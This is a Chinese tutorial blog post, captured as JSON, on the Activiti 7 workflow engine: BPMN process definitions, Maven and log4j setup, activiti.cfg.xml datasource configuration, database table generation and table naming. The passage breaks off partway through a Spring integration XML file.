{"posts":[{"title":"【Activiti】工作流引擎 Activiti 教程(非常详细)","text":"# 【Activiti】工作流引擎 Activiti 教程 (非常详细) # 更多内容关注微信公众号：fullstack888 # 一、工作流介绍 # 1.1 概念 工作流 (Workflow)，就是通过计算机对业务流程自动化执行管理。它主要解决的是 “使在多个参与者之间按照某种预定义的规则自动进行传递文档、信息或任务的过程，从而实现某个预期的业务目标，或者促使此目标的实现”。 # 1.2 工作流系统 一个软件系统中具有工作流的功能，我们把它称为工作流系统，一个系统中工作流的功能是什么？就是对系统的业务流程进行自动化管理，所以工作流是建立在业务流程的基础上，所以一个软件的系统核心根本上还是系统的业务流程，工作流只是协助进行业务流程管理。即使没有工作流业务系统也可以开发运行，只不过有了工作流可以更好的管理业务流程，提高系统的可扩展性。 # 1.3 适用行业 消费品行业，制造业，电信服务业，银证险等金融服务业，物流服务业，物业服务业，物业管理，大中型进出口贸易公司，政府事业机构，研究院所及教育服务业等，特别是大的跨国企业和集团公司。 # 1.4 具体应用 1、关键业务流程： 订单、报价处理、合同审核、客户电话处理、供应链管理等 2、行政管理类： 出差申请、加班申请、请假申请、用车申请、各种办公用品申请、购买申请、日报周报等凡是原来手工流转处理的行政表单。 3、人事管理类： 员工培训安排、绩效考评、职位变动处理、员工档案信息管理等。 4、财务相关类： 付款请求、应收款处理、日常报销处理、出差报销、预算和计划申请等。 5、客户服务类： 客户信息管理、客户投诉、请求处理、售后服务管理等。 6、特殊服务类： ISO 系列对应流程、质量管理对应流程、产品数据信息管理、贸易公司报关处理、物流公司货物跟踪处理等各种通过表单逐步手工流转完成的任务均可应用工作流软件自动规范地实施。 # 1.5 实现方式 在没有专门的工作流引擎之前，我们之前为了实现流程控制，通常的做法就是采用状态字段的值来跟踪流程的变化情况。这样不同角色的用户，通过状态字段的取值来决定记录是否显示。 针对有权限可以查看的记录，当前用户根据自己的角色来决定审批是否合格的操作。如果合格将状态字段设置一个值，来代表合格；当然如果不合格也需要设置一个值来代表不合格的情况。 这是一种最为原始的方式。通过状态字段虽然做到了流程控制，但是当我们的流程发生变更的时候，这种方式所编写的代码也要进行调整。 那么有没有专业的方式来实现工作流的管理呢？并且可以做到业务流程变化之后，我们的程序可以不用改变，如果可以实现这样的效果，那么我们的业务系统的适应能力就得到了极大提升。 # 二、Activiti7 概述 # 2.1 介绍 Alfresco 软件在 2010 年 5 月 17 日宣布 Activiti 业务流程管理（BPM）开源项目的正式启动，其首席架构师由业务流程管理 BPM 的专家 Tom Baeyens 担任，Tom Baeyens 就是原来 jbpm 的架构师，而 jbpm 是一个非常有名的工作流引擎，当然 activiti 也是一个工作流引擎。 Activiti 是一个工作流引擎， activiti 可以将业务系统中复杂的业务流程抽取出来，使用专门的建模语言 BPMN2.0 进行定义，业务流程按照预先定义的流程进行执行，实现了系统的流程由 activiti 进行管理，减少业务系统由于流程变更进行系统升级改造的工作量，从而提高系统的健壮性，同时也减少了系统开发维护成本。 官方网站：https://www.activiti.org/ 经历的版本: 目前最新版本：Activiti7.0.0.Beta # 2.1.1 BPM BPM（Business Process Management），即业务流程管理，是一种规范化的构造端到端的业务流程，以持续的提高组织业务效率。常见商业管理教育如 EMBA、MBA 等均将 BPM 包含在内。 # 2.1.2 BPM 软件 BPM 软件就是根据企业中业务环境的变化，推进人与人之间、人与系统之间以及系统与系统之间的整合及调整的经营方法与解决方案的 IT 工具。 通过 BPM 软件对企业内部及外部的业务流程的整个生命周期进行建模、自动化、管理监控和优化，使企业成本降低，利润得以大幅提升。 BPM 软件在企业中应用领域广泛，凡是有业务流程的地方都可以 BPM 软件进行管理，比如企业人事办公管理、采购流程管理、公文审批流程管理、财务管理等。 # 2.1.3 BPMN BPMN（Business Process Model AndNotation）- 业务流程模型和符号 是由 BPMI（BusinessProcess Management Initiative）开发的一套标准的业务流程建模符号，使用 BPMN 提供的符号可以创建业务流程。 2004 年 5 月发布了 BPMN1.0 规范.BPMI 于 2005 年 9 月并入 OMG（The Object Management Group 对象管理组织) 组织。OMG 于 2011 年 1 月发布 BPMN2.0 的最终版本。 具体发展历史如下: BPMN 是目前被各 BPM 厂商广泛接受的 BPM 标准。Activiti 就是使用 BPMN 2.0 进行流程建模、流程执行管理，它包括很多的建模符号，比如：Event 用一个圆圈表示，它是流程中运行过程中发生的事情。 活动用圆角矩形表示，一个流程由一个活动或多个活动组成 Bpmn 图形其实是通过 xml 表示业务流程，上边的.bpmn 文件使用文本编辑器打开： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;definitions xmlns=&quot;http://www.omg.org/spec/BPMN/20100524/MODEL&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:activiti=&quot;http://activiti.org/bpmn&quot; xmlns:bpmndi=&quot;http://www.omg.org/spec/BPMN/20100524/DI&quot; xmlns:omgdc=&quot;http://www.omg.org/spec/DD/20100524/DC&quot; xmlns:omgdi=&quot;http://www.omg.org/spec/DD/20100524/DI&quot; typeLanguage=&quot;http://www.w3.org/2001/XMLSchema&quot; expressionLanguage=&quot;http://www.w3.org/1999/XPath&quot; targetNamespace=&quot;http://www.activiti.org/test&quot;&gt; &lt;process id=&quot;myProcess&quot; name=&quot;My process&quot; isExecutable=&quot;true&quot;&gt; &lt;startEvent id=&quot;startevent1&quot; name=&quot;Start&quot;&gt;&lt;/startEvent&gt; &lt;userTask id=&quot;usertask1&quot; name=&quot;创建请假单&quot;&gt;&lt;/userTask&gt; &lt;sequenceFlow id=&quot;flow1&quot; sourceRef=&quot;startevent1&quot; targetRef=&quot;usertask1&quot;&gt;&lt;/sequenceFlow&gt; &lt;userTask id=&quot;usertask2&quot; name=&quot;部门经理审核&quot;&gt;&lt;/userTask&gt; &lt;sequenceFlow id=&quot;flow2&quot; sourceRef=&quot;usertask1&quot; targetRef=&quot;usertask2&quot;&gt;&lt;/sequenceFlow&gt; &lt;userTask id=&quot;usertask3&quot; name=&quot;人事复核&quot;&gt;&lt;/userTask&gt; &lt;sequenceFlow id=&quot;flow3&quot; sourceRef=&quot;usertask2&quot; targetRef=&quot;usertask3&quot;&gt;&lt;/sequenceFlow&gt; &lt;endEvent id=&quot;endevent1&quot; name=&quot;End&quot;&gt;&lt;/endEvent&gt; &lt;sequenceFlow id=&quot;flow4&quot; sourceRef=&quot;usertask3&quot; targetRef=&quot;endevent1&quot;&gt;&lt;/sequenceFlow&gt; &lt;/process&gt; &lt;bpmndi:BPMNDiagram id=&quot;BPMNDiagram_myProcess&quot;&gt; &lt;bpmndi:BPMNPlane bpmnElement=&quot;myProcess&quot; id=&quot;BPMNPlane_myProcess&quot;&gt; &lt;bpmndi:BPMNShape bpmnElement=&quot;startevent1&quot; id=&quot;BPMNShape_startevent1&quot;&gt; &lt;omgdc:Bounds height=&quot;35.0&quot; width=&quot;35.0&quot; x=&quot;130.0&quot; y=&quot;160.0&quot;&gt;&lt;/omgdc:Bounds&gt; &lt;/bpmndi:BPMNShape&gt; &lt;bpmndi:BPMNShape bpmnElement=&quot;usertask1&quot; id=&quot;BPMNShape_usertask1&quot;&gt; &lt;omgdc:Bounds height=&quot;55.0&quot; width=&quot;105.0&quot; x=&quot;210.0&quot; y=&quot;150.0&quot;&gt;&lt;/omgdc:Bounds&gt; &lt;/bpmndi:BPMNShape&gt; &lt;bpmndi:BPMNShape bpmnElement=&quot;usertask2&quot; id=&quot;BPMNShape_usertask2&quot;&gt; &lt;omgdc:Bounds height=&quot;55.0&quot; width=&quot;105.0&quot; x=&quot;360.0&quot; y=&quot;150.0&quot;&gt;&lt;/omgdc:Bounds&gt; &lt;/bpmndi:BPMNShape&gt; &lt;bpmndi:BPMNShape bpmnElement=&quot;usertask3&quot; id=&quot;BPMNShape_usertask3&quot;&gt; &lt;omgdc:Bounds height=&quot;55.0&quot; width=&quot;105.0&quot; x=&quot;510.0&quot; y=&quot;150.0&quot;&gt;&lt;/omgdc:Bounds&gt; &lt;/bpmndi:BPMNShape&gt; &lt;bpmndi:BPMNShape bpmnElement=&quot;endevent1&quot; id=&quot;BPMNShape_endevent1&quot;&gt; &lt;omgdc:Bounds height=&quot;35.0&quot; width=&quot;35.0&quot; x=&quot;660.0&quot; y=&quot;160.0&quot;&gt;&lt;/omgdc:Bounds&gt; &lt;/bpmndi:BPMNShape&gt; &lt;bpmndi:BPMNEdge bpmnElement=&quot;flow1&quot; id=&quot;BPMNEdge_flow1&quot;&gt; &lt;omgdi:waypoint x=&quot;165.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;omgdi:waypoint x=&quot;210.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;/bpmndi:BPMNEdge&gt; &lt;bpmndi:BPMNEdge bpmnElement=&quot;flow2&quot; id=&quot;BPMNEdge_flow2&quot;&gt; &lt;omgdi:waypoint x=&quot;315.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;omgdi:waypoint x=&quot;360.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;/bpmndi:BPMNEdge&gt; &lt;bpmndi:BPMNEdge bpmnElement=&quot;flow3&quot; id=&quot;BPMNEdge_flow3&quot;&gt; &lt;omgdi:waypoint x=&quot;465.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;omgdi:waypoint x=&quot;510.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;/bpmndi:BPMNEdge&gt; &lt;bpmndi:BPMNEdge bpmnElement=&quot;flow4&quot; id=&quot;BPMNEdge_flow4&quot;&gt; &lt;omgdi:waypoint x=&quot;615.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;omgdi:waypoint x=&quot;660.0&quot; y=&quot;177.0&quot;&gt;&lt;/omgdi:waypoint&gt; &lt;/bpmndi:BPMNEdge&gt; &lt;/bpmndi:BPMNPlane&gt; &lt;/bpmndi:BPMNDiagram&gt;&lt;/definitions&gt; # 2.2 使用步骤 # 部署 activiti Activiti 是一个工作流引擎（其实就是一堆 jar 包 API），业务系统访问 (操作) activiti 的接口，就可以方便的操作流程相关数据，这样就可以把工作流环境与业务系统的环境集成在一起。 # 流程定义 使用 activiti 流程建模工具 (activity-designer) 定义业务流程 (.bpmn 文件) 。 .bpmn 文件就是业务流程定义文件，通过 xml 定义业务流程。 # 流程定义部署 activiti 部署业务流程定义（.bpmn 文件）。 使用 activiti 提供的 api 把流程定义内容存储起来，在 Activiti 执行过程中可以查询定义的内容 Activiti 执行把流程定义内容存储在数据库中 # 启动一个流程实例 流程实例也叫：ProcessInstance 启动一个流程实例表示开始一次业务流程的运行。 在员工请假流程定义部署完成后，如果张三要请假就可以启动一个流程实例，如果李四要请假也启动一个流程实例，两个流程的执行互相不影响。 # 用户查询待办任务 (Task) 因为现在系统的业务流程已经交给 activiti 管理，通过 activiti 就可以查询当前流程执行到哪了，当前用户需要办理什么任务了，这些 activiti 帮我们管理了，而不需要开发人员自己编写在 sql 语句查询。 # 用户办理任务 用户查询待办任务后，就可以办理某个任务，如果这个任务办理完成还需要其它用户办理，比如采购单创建后由部门经理审核，这个过程也是由 activiti 帮我们完成了。 # 流程结束 当任务办理完成没有下一个任务结点了，这个流程实例就完成了。 # 三、Activiti 环境 # 3.1 开发环境 Jdk1.8 或以上版本 Mysql 5 及以上的版本 Tomcat8.5 IDEA 注意：activiti 的流程定义工具插件可以安装在 IDEA 下，也可以安装在 Eclipse 工具下 # 3.2 Activiti 环境 我们使用： Activiti7.0.0.Beta1 默认支持 spring5 # 3.2.1 下载 activiti7 Activiti 下载地址： http://activiti.org/download.html ，Maven 的依赖如下： 1234567891011&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-dependencies&lt;/artifactId&gt; &lt;version&gt;7.0.0.Beta1&lt;/version&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;type&gt;pom&lt;/type&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; # 1) Database： activiti 运行需要有数据库的支持，支持的数据库有：h2, mysql, oracle, postgres, mssql, db2。 # 3.2.2 流程设计器 IDEA 下安装 在 IDEA 的 File 菜单中找到子菜单”Settings”, 后面我们再选择左侧的 “plugins” 菜单，如下图所示： 此时我们就可以搜索到 actiBPM 插件，它就是 Activiti Designer 的 IDEA 版本，我们点击 Install 安装。 安装好后，页面如下： 提示需要重启 idea，点击重启。 重启完成后，再次打开 Settings 下的 Plugins（插件列表），点击右侧的 Installed（已安装的插件），在列表中看到 actiBPM，就说明已经安装成功了，如下图所示： 后面的课程里，我们会使用这个流程设计器进行 Activiti 的流程设计。 # 3.3 Activiti 的数据库支持 Activiti 在运行时需要数据库的支持，使用 25 张表，把流程定义节点内容读取到数据库表中，以供后续使用。 # 3.3.1 Activiti 支持的数据库 activiti 支持的数据库和版本如下： # 3.3.2 在 MySQL 生成表 3.3.2.1 创建数据库 创建 mysql 数据库 activiti （名字任意）： 1CREATE DATABASE activiti DEFAULT CHARACTER SET utf8; 3.3.2.2 使用 java 代码生成表 创建 java 工程 使用 idea 创建 java 的 maven 工程，取名：activiti01。 加入 maven 依赖的坐标（jar 包） 首先需要在 java 工程中加入 ProcessEngine 所需要的 jar 包，包括： activiti-engine-7.0.0.beta1.jar activiti 依赖的 jar 包：mybatis、 alf4j、 log4j 等 activiti 依赖的 spring 包 mysql 数据库驱动 第三方数据连接池 dbcp 单元测试 Junit-4.12.jar 我们使用 maven 来实现项目的构建，所以应当导入这些 jar 所对应的坐标到 pom.xml 文件中。 完整的依赖内容如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;properties&gt; &lt;slf4j.version&gt;1.6.6&lt;/slf4j.version&gt; &lt;log4j.version&gt;1.2.12&lt;/log4j.version&gt; &lt;activiti.version&gt;7.0.0.Beta1&lt;/activiti.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-engine&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-spring&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- bpmn 模型处理 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-bpmn-model&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- bpmn 转换 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-bpmn-converter&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- bpmn json数据转换 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-json-converter&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- bpmn 布局 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti&lt;/groupId&gt; &lt;artifactId&gt;activiti-bpmn-layout&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- activiti 云支持 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.activiti.cloud&lt;/groupId&gt; &lt;artifactId&gt;activiti-cloud-services-api&lt;/artifactId&gt; &lt;version&gt;${activiti.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mysql驱动 --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.40&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mybatis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.4.5&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 链接池 --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-dbcp&lt;/groupId&gt; &lt;artifactId&gt;commons-dbcp&lt;/artifactId&gt; &lt;version&gt;1.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;/dependency&gt; &lt;!-- log start --&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 添加 log4j 日志配置 我们使用 log4j 日志包，可以对日志进行配置 在 resources 下创建 log4j.properties 123456789101112131415# Set root category priority to INFO and its only appender to CONSOLE.#log4j.rootCategory=INFO, CONSOLE debug info warn error fatallog4j.rootCategory=debug, CONSOLE, LOGFILE# Set the enterprise logger category to FATAL and its only appender to CONSOLE.log4j.logger.org.apache.axis.enterprise=FATAL, CONSOLE# CONSOLE is set to be a ConsoleAppender using a PatternLayout.log4j.appender.CONSOLE=org.apache.log4j.ConsoleAppenderlog4j.appender.CONSOLE.layout=org.apache.log4j.PatternLayoutlog4j.appender.CONSOLE.layout.ConversionPattern=%d{ISO8601} %-6r[%15.15t] %-5p %30.30c %x - %m\\n# LOGFILE is set to be a File appender using a PatternLayout.log4j.appender.LOGFILE=org.apache.log4j.FileAppenderlog4j.appender.LOGFILE.File=f:\\act\\activiti.loglog4j.appender.LOGFILE.Append=truelog4j.appender.LOGFILE.layout=org.apache.log4j.PatternLayoutlog4j.appender.LOGFILE.layout.ConversionPattern=%d{ISO8601} %-6r[%15.15t] %-5p %30.30c %x - %m\\n 添加 activiti 配置文件 我们使用 activiti 提供的默认方式来创建 mysql 的表。 默认方式的要求是在 resources 下创建 activiti.cfg.xml 文件，注意：默认方式目录和文件名不能修改，因为 activiti 的源码中已经设置，到固定的目录读取固定文件名的文件。 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;xmlns:context=&quot;http://www.springframework.org/schema/context&quot;xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/contexhttp://www.springframework.org/schema/context/spring-context.xsdhttp://www.springframework.org/schema/txhttp://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt;&lt;/beans&gt; 在 activiti.cfg.xml 中进行配置 默认方式要在在 activiti.cfg.xml 中 bean 的名字叫 processEngineConfiguration ，名字不可修改 在这里有 2 中配置方式：一种是单独配置数据源，一种是不单独配置数据源 1、直接配置 processEngineConfiguration processEngineConfiguration 用来创建 ProcessEngine ，在创建 ProcessEngine 时会执行数据库的操作。 1234567891011121314151617181920212223&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/contexhttp://www.springframework.org/schema/context/spring-context.xsdhttp://www.springframework.org/schema/txhttp://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt; &lt;!-- 默认id对应的值 为processEngineConfiguration --&gt; &lt;!-- processEngine Activiti的流程引擎 --&gt; &lt;bean id=&quot;processEngineConfiguration&quot; class=&quot;org.activiti.engine.impl.cfg.StandaloneProcessEngineConfiguration&quot;&gt; &lt;property name=&quot;jdbcDriver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;property name=&quot;jdbcUrl&quot; value=&quot;jdbc:mysql:///activiti&quot;/&gt; &lt;property name=&quot;jdbcUsername&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;jdbcPassword&quot; value=&quot;123456&quot;/&gt; &lt;!-- activiti数据库表处理策略 --&gt; &lt;property name=&quot;databaseSchemaUpdate&quot; value=&quot;true&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; 2、配置数据源后，在 processEngineConfiguration 引用 首先配置数据源 123456789101112131415161718192021222324252627282930&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/contexhttp://www.springframework.org/schema/context/spring-context.xsdhttp://www.springframework.org/schema/txhttp://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt; &lt;!-- 这里可以使用 链接池 dbcp--&gt; &lt;bean id=&quot;dataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot;&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql:///activiti&quot; /&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot; /&gt; &lt;property name=&quot;password&quot; value=&quot;123456&quot; /&gt; &lt;property name=&quot;maxActive&quot; value=&quot;3&quot; /&gt; &lt;property name=&quot;maxIdle&quot; value=&quot;1&quot; /&gt; &lt;/bean&gt; &lt;bean id=&quot;processEngineConfiguration&quot; class=&quot;org.activiti.engine.impl.cfg.StandaloneProcessEngineConfiguration&quot;&gt; &lt;!-- 引用数据源 上面已经设置好了--&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot; /&gt; &lt;!-- activiti数据库表处理策略 --&gt; &lt;property name=&quot;databaseSchemaUpdate&quot; value=&quot;true&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; java 类编写程序生成表 创建一个测试类，调用 activiti 的工具类，生成 acitivti 需要的数据库表。 直接使用 activiti 提供的工具类 ProcessEngines ，会默认读取 classpath 下的 activiti.cfg.xml 文件，读取其中的数据库配置，创建 ProcessEngine ，在创建 ProcessEngine 时会自动创建表。 代码如下： 1234567891011121314151617package com.itheima.activiti01.test; import org.activiti.engine.ProcessEngine;import org.activiti.engine.ProcessEngineConfiguration;import org.junit.Test; public class TestDemo { /** * 生成 activiti的数据库表 */ @Test public void testCreateDbTable() { //使用classpath下的activiti.cfg.xml中的配置创建processEngine ProcessEngine processEngine = ProcessEngines.getDefaultProcessEngine(); System.out.println(processEngine); }} 说明： 运行以上程序段即可完成 activiti 表创建，通过改变 activiti.cfg.xml 中 databaseSchemaUpdate 参数的值执行不同的数据表处理策略。 上 边 的 方法 getDefaultProcessEngine 方法在执行时，从 activiti.cfg.xml 中找固定的名称 processEngineConfiguration 。 在测试程序执行过程中，idea 的控制台会输出日志，说明程序正在创建数据表，类似如下，注意红线内容： 执行完成后我们查看数据库， 创建了 25 张表，结果如下： 到这，我们就完成 activiti 运行需要的数据库和表的创建。 # 3.4 表结构介绍 # 3.4.1 表的命名规则和作用 看到刚才创建的表，我们发现 Activiti 的表都以 ACT_ 开头。 第二部分是表示表的用途的两个字母标识。用途也和服务的 API 对应。 ACT_RE ：'RE’表示 repository。这个前缀的表包含了流程定义和流程静态资源 （图片，规则，等等）。 ACT_RU ：'RU’表示 runtime。这些运行时的表，包含流程实例，任务，变量，异步任务，等运行中的数据。Activiti 只在流程实例执行过程中保存这些数据， 在流程结束时就会删除这些记录。这样运行时表可以一直很小速度很快。 ACT_HI ：'HI’表示 history。这些表包含历史数据，比如历史流程实例， 变量，任务等等。 ACT_GE ：GE 表示 general。通用数据， 用于不同场景下 # 3.4.2 Activiti 数据表介绍 # 四、Activiti 类关系图 上面我们完成了 Activiti 数据库表的生成，java 代码中我们调用 Activiti 的工具类，下面来了解 Activiti 的类关系 # 4.1 类关系图 在新版本中，我们通过实验可以发现 IdentityService ， FormService 两个 Serivce 都已经删除了。 所以后面我们对于这两个 Service 也不讲解了，但老版本中还是有这两个 Service，同学们需要了解一下 # 4.2 activiti.cfg.xml activiti 的引擎配置文件，包括： ProcessEngineConfiguration 的定义、数据源定义、事务管理器等，此文件其实就是一个 spring 配置文件。 # 4.3 流程引擎配置类 流程引擎的配置类（ ProcessEngineConfiguration ），通过 ProcessEngineConfiguration 可以创建工作流引擎 ProceccEngine ，常用的两种方法如下： # 4.3.1 StandaloneProcessEngineConfiguration 使用 StandaloneProcessEngineConfigurationActiviti 可以单独运行，来创建 ProcessEngine ， Activiti 会自己处理事务。 配置文件方式： 通常在 activiti.cfg.xml 配置文件中定义一个 id 为 processEngineConfiguration 的 bean。 方法如下： 1234567891011121314&lt;bean id=&quot;processEngineConfiguration&quot; class=&quot;org.activiti.engine.impl.cfg.StandaloneProcessEngineConfiguration&quot;&gt; &lt;!--配置数据库相关的信息--&gt; &lt;!--数据库驱动--&gt; &lt;property name=&quot;jdbcDriver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;!--数据库链接--&gt; &lt;property name=&quot;jdbcUrl&quot; value=&quot;jdbc:mysql:///activiti&quot;/&gt; &lt;!--数据库用户名--&gt; &lt;property name=&quot;jdbcUsername&quot; value=&quot;root&quot;/&gt; &lt;!--数据库密码--&gt; &lt;property name=&quot;jdbcPassword&quot; value=&quot;123456&quot;/&gt; &lt;!--actviti数据库表在生成时的策略 true - 如果数据库中已经存在相应的表，那么直接使用，如果不存在，那么会创建--&gt; &lt;property name=&quot;databaseSchemaUpdate&quot; value=&quot;true&quot;/&gt; &lt;/bean&gt; 还可以加入连接池: 12345678910111213141516171819202122232425262728&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/contexhttp://www.springframework.org/schema/context/spring-context.xsdhttp://www.springframework.org/schema/txhttp://www.springframework.org/schema/tx/spring-tx.xsd&quot;&gt; &lt;bean id=&quot;dataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot;&gt; &lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql:///activiti&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;123456&quot;/&gt; &lt;property name=&quot;maxActive&quot; value=&quot;3&quot;/&gt; &lt;property name=&quot;maxIdle&quot; value=&quot;1&quot;/&gt; &lt;/bean&gt; &lt;!--在默认方式下 bean的id 固定为 processEngineConfiguration--&gt; &lt;bean id=&quot;processEngineConfiguration&quot; class=&quot;org.activiti.engine.impl.cfg.StandaloneProcessEngineConfiguration&quot;&gt; &lt;!--引入上面配置好的 链接池--&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt; &lt;!--actviti数据库表在生成时的策略 true - 如果数据库中已经存在相应的表，那么直接使用，如果不存在，那么会创建--&gt; &lt;property name=&quot;databaseSchemaUpdate&quot; value=&quot;true&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; # 4.3.2 SpringProcessEngineConfiguration 通过 org.activiti.spring.SpringProcessEngineConfiguration 与 Spring 整合。 创建 spring 与 activiti 的整合配置文件： activity-spring.cfg.xml （名称可修改） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.1.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-3.1.xsd http://www.springframework.org/schema/context 